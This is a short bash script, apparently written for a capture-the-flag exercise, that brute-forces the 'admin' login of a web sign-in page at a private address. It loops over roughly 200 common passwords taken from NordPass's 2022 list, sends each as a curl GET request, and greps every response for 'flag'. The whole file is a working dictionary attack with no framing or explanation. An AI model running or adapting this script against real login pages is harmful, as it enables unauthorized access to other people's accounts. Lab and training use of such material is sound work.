#!/bin/bash

# https://nordpass.com/fr/most-common-passwords-list/
# telecharger le PDF
# liste 2022 :
my_array=("password" "123456" "123456789" "guest" "qwerty" "12345678" "111111" "12345" "col123456" "123123" "1234567" "1234" "1234567890" "000000" "555555" "666666" "123321" "654321" "7777777" "123" "D1lakiss" "777777" "110110jp" "1111" "987654321" "121212" "Gizli" "abc123" "112233" "azerty" "159753" "1q2w3e4r" "54321" "pass@123" "222222" "qwertyuiop" "qwerty123" "qazwsx" "vip" "asdasd" "123qwe" "123654" "iloveyou" "a1b2c3" "999999" "Groupd2013" "1q2w3e" "usr" "Liman1000" "1111111" "333333" "123123123" "9136668099" "11111111" "1qaz2wsx" "password1" "mar20lt" "987654321" "gfhjkm" "159357" "abcd1234" "131313" "789456" "luzit2000" "aaaaaa" "zxcvbnm" "asdfghjkl" "1234qwer" "88888888" "dragon" "987654" "888888" "qwe123" "football" "3601" "asdfgh" "master" "samsung" "12345678910" "killer" "1237895" "1234561" "12344321" "daniel" "000000" "444444" "101010" "fuckyou" "qazwsxedc" "789456123" "super123" "qwer1234" "123456789a" "823477aA" "147258369" "unknown" "98765" "q1w2e3r4" "232323" "102030" "12341234" "147258" "shadow" "123456a" "87654321" "10203" "pokemon" "princess" "azertyuiop" "thomas" "baseball" "monkey" "jordan" "michael" "love" "1111111111" "11223344" "123456789" "asdf1234" "147852" "252525" "11111" "loulou" "111222" "superman" "qweasdzxc" "soccer" "qqqqqq" "123abc" "computer" "qweasd" "zxcvbn" "sunshine" "1234554321" "asd123" "marina" "lol123" "a123456" "Password" "123789" "jordan23" "jessica" "212121" "7654321" "googledummy" "qwerty1" "123654789" "naruto" "Indya123" "internet" "doudou" "anmol123" "55555" "andrea" "anthony" "martin" "basketball" "nicole" "xxxxxx" "1qazxsw2" "charlie" "12345qwert" "zzzzzz" "q1w2e3" "147852369" "hello" "welcome" "marseille" "456123" "secret" "matrix" "zaq12wsx" "password123" "qwertyu" "hunter" "freedom" "999999999" "eminem" "junior" "696969" "andrew" "michelle" "wow12345" "juventus" "batman" "justin" "12qwaszx" "Pass@123" "passw0rd" "soleil" "nikita" "Password1" "qweqwe" "nicolas" "robert" "starwars" "liverpool" "5555555" "bonjour" "124578" )
count=0

# Parcourir l'array et afficher chaque élément
for pass in "${my_array[@]}"; do
	username="admin"
	url="http://10.12.200.47/?page=signin&username=$username&password=$pass&Login=Login"
	((count++))
	echo "$count $url"
	curl -s $url | grep -i "flag"
done